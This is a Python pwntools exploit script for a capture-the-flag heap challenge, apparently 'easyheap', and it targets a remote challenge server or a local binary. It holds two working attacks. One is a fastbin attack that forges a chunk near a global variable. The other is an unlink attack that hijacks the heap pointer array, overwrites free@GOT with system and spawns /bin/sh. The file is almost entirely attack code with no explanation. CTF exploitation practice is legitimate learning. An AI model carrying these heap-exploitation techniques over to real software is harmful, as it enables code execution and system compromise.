from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='amd64', os='linux')

if len(sys.argv) > 1:
  conn = remote('node4.buuoj.cn', 25593)
else:
  conn = process(sys.argv[0][:-7])
  gdb.attach(conn, 'b *0x400ce8')
 
# gadgets
cat_flag = 0x400c23
magic = 0x6020c0
magic_fake_chunk = 0x6020ad

# func
def menu(select):
    conn.recvuntil(b'choice :')
    conn.sendline(str(select).encode())

def malloc(size, content):
    menu(1)
    conn.sendlineafter(b'Heap : ', str(size).encode())
    conn.sendlineafter(b'heap:', content)

def edit(index, size, content):
    menu(2)
    conn.sendlineafter(b'Index :', str(index).encode())
    conn.sendlineafter(b'Heap : ', str(size).encode())
    conn.sendlineafter(b'heap : ', content)

def free(index):
    menu(3)
    conn.sendlineafter(b'Index :', str(index).encode())

def exp1():
    # fastbin attack 
    # '/home/pwn/flag' doesn't exist
    malloc(0x60, b'')
    malloc(0x60, b'')
    malloc(0x60, b'')
    free(2)
    free(1)


    payload = b'a' * 0x68 + p64(0x71) + p64(magic_fake_chunk)
    edit(0, len(payload), payload)

    malloc(0x60, b'')
    payload = b'a' * 0x13 + p64(0x13ff)
    malloc(0x60, b'payload')

    menu(4869)
    conn.recv()
    conn.interactive()
        
    # fastbin attack
    # hijack malloc_hook
    # cannot leak libc addr

def exp2():
    # unlink
    # hijack heap array
    # hijack malloc/free/atoi got table

    # step-1 unlink
    heaparray = 0x6020e0
    system = 0x00400700

    malloc(0x20, b'') # id0
    malloc(0x80, b'') # id1
    malloc(0x20, b'/bin/sh') # id2
    fake_chunk = p64(0) + p64(0x20) + p64(heaparray - 0x18) + p64(heaparray - 0x10)
    payload = fake_chunk + p64(0x20) + p64(0x90)
    edit(0, len(payload), payload)

    free(1)
    # ptr id0 => 0x6020c8

    # step-2 hijack heaparray
    # overwrite with free got

    elf = ELF('./easyheap')
    free_got = elf.got['free']
    payload = p64(0x0) * 3 + p64(free_got)
    edit(0, len(payload), payload)
    
    # step-3 hijack free@got with system
    payload =  p64(system) 
    edit(0, len(payload), payload)

    free(2)
    conn.interactive()



if __name__ == "__main__":
    exp2()
